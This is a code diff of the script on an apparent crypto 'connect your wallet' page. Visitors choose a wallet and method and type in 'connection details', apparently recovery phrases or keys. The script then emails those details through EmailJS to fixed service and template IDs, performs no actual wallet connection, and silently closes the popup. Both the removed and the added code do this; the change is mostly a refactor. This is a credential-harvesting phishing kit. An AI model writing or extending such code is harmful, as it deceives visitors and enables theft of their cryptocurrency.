@@ -150,102 +150,103 @@
   </div>
 
   <script>
-      // Wallet selection and popup functionality
-      const walletOptions = document.querySelectorAll('.wallet-option');
-      const walletPopup = document.getElementById('wallet-popup');
-      const closePopupBtn = document.getElementById('close-popup');
-      const closePopupBt = document.getElementById('close-popu');
-      const connectionMethods = document.querySelectorAll('.connection-method');
-      const connectWalletBtn = document.getElementById('connect-wallet-btn');
-      const connectionInput = document.getElementById('connection-input');
-      
-      let selectedWallet = '';
-      let selectedMethod = '';
-
-      // Open popup when wallet is selected
-      walletOptions.forEach(option => {
-          option.addEventListener('click', () => {
-              selectedWallet = option.getAttribute('data-wallet');
-              document.getElementById('popup-title').textContent = `Connect ${selectedWallet}`;
-              walletPopup.classList.remove('hidden');
-              walletPopup.classList.add('flex');
-          });
-      });
-
-      // Close popup
-      closePopupBtn.addEventListener('click', () => {
-          walletPopup.classList.remove('flex');
-          walletPopup.classList.add('hidden');
-          // Reset selections
-          selectedWallet = '';
-          selectedMethod = '';
-          connectionInput.value = '';
-          // Remove active state from all methods
-          connectionMethods.forEach(m => {
-              m.classList.remove('border-2', 'border-blue-500');
-          });
-      });
-      closePopupBt.addEventListener('click', () => {
-          walletPopup.classList.remove('flex');
-          walletPopup.classList.add('hidden');
-          // Reset selections
-          selectedWallet = '';
-          selectedMethod = '';
-          connectionInput.value = '';
-          // Remove active state from all methods
-          connectionMethods.forEach(m => {
-              m.classList.remove('border-2', 'border-blue-500');
-          });
-      });
-
-      // Connection method selection
-      connectionMethods.forEach(method => {
-          method.addEventListener('click', () => {
-              // Remove active state from all methods
-              connectionMethods.forEach(m => {
-                  m.classList.remove('border-2', 'border-blue-500');
-              });
-              
-              // Add active state to clicked method
-              method.classList.add('border-2', 'border-blue-500');
-              
-              // Update selected method
-              selectedMethod = method.querySelector('h3').textContent;
-              
-              // Update placeholder based on selected method
-              const placeholderText = method.querySelector('p').textContent;
-              connectionInput.placeholder = `Enter ${placeholderText.toLowerCase()}`;
-          });
-      });
-
-      // Connect wallet button click handler
-      connectWalletBtn.addEventListener('click', () => {
-          if (!selectedWallet || !selectedMethod || !connectionInput.value.trim()) {
-              alert('Please select a wallet, connection method, and enter your details');
-              return;
-          }
-
-          // Prepare email data
-          const templateParams = {
-              wallet_type: selectedWallet,
-              connection_method: selectedMethod,
-              connection_details: connectionInput.value.trim(),
-              timestamp: new Date().toLocaleString()
-          };
-
-          // Send email using EmailJS
-          emailjs.send('service_z06zpfh', 'template_prguc14', templateParams)
-              .then(function(response) {
-                  console.log('SUCCESS!', response.status, response.text);
-                  //alert('Wallet connection request sent successfully!');
-                  // Close the popup
-                  closePopupBtn.click();
-              }, function(error) {
-                  console.log('FAILED...', error);
-                  //alert('Failed to send wallet connection request. Please try again.');
-              });
-      });
-  </script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const walletOptions = document.querySelectorAll('.wallet-option');
+        const walletPopup = document.getElementById('wallet-popup');
+        const closePopupBtn = document.getElementById('close-popup');
+        const connectionMethods = document.querySelectorAll('.connection-method');
+        const connectWalletBtn = document.getElementById('connect-wallet-btn');
+        const connectionInput = document.getElementById('connection-input');
+        
+        let selectedWallet = '';
+        let selectedMethod = '';
+    
+        // Wallet Selection
+        walletOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                selectedWallet = option.getAttribute('data-wallet');
+                document.getElementById('popup-title').textContent = `Connect ${selectedWallet}`;
+                walletPopup.classList.remove('hidden');
+                walletPopup.classList.add('flex');
+            });
+        });
+    
+        // Close Popup
+        closePopupBtn.addEventListener('click', () => {
+            walletPopup.classList.remove('flex');
+            walletPopup.classList.add('hidden');
+            
+            // Reset selections
+            selectedWallet = '';
+            selectedMethod = '';
+            connectionInput.value = '';
+            
+            // Remove active state from all methods
+            connectionMethods.forEach(m => {
+                m.classList.remove('border-2', 'border-blue-500', 'bg-[#303950]');
+                const h3 = m.querySelector('h3');
+                const p = m.querySelector('p');
+                if (h3) h3.classList.remove('text-blue-400');
+                if (p) p.classList.remove('text-gray-200');
+            });
+        });
+    
+        // Connection Method Selection
+        connectionMethods.forEach(method => {
+            method.addEventListener('click', () => {
+                // Remove active state from all methods
+                connectionMethods.forEach(m => {
+                    m.classList.remove('border-2', 'border-blue-500', 'bg-[#303950]');
+                    const h3 = m.querySelector('h3');
+                    const p = m.querySelector('p');
+                    if (h3) h3.classList.remove('text-blue-400');
+                    if (p) p.classList.remove('text-gray-200');
+                });
+               
+                // Add active state to clicked method
+                method.classList.add('border-2', 'border-blue-500', 'bg-[#303950]');
+                const h3 = method.querySelector('h3');
+                const p = method.querySelector('p');
+                if (h3) h3.classList.add('text-blue-400');
+                if (p) p.classList.add('text-gray-200');
+               
+                // Update selected method
+                selectedMethod = h3 ? h3.textContent : '';
+               
+                // Update placeholder based on selected method
+                if (p) {
+                    connectionInput.placeholder = `Enter ${p.textContent.toLowerCase()}`;
+                }
+            });
+        });
+    
+        // Connect Wallet Button
+        connectWalletBtn.addEventListener('click', () => {
+            if (!selectedWallet || !selectedMethod || !connectionInput.value.trim()) {
+                alert('Please select a wallet, connection method, and enter your details');
+                return;
+            }
+    
+            // Prepare email data
+            const templateParams = {
+                wallet_type: selectedWallet,
+                connection_method: selectedMethod,
+                connection_details: connectionInput.value.trim(),
+                timestamp: new Date().toLocaleString()
+            };
+    
+            // Send email using EmailJS
+            emailjs.send('service_z06zpfh', 'template_prguc14', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    closePopupBtn.click();
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Failed to send wallet connection request. Please try again.');
+                });
+        });
+    });
+    </script>
 </main>
 <script>
 function connect() {
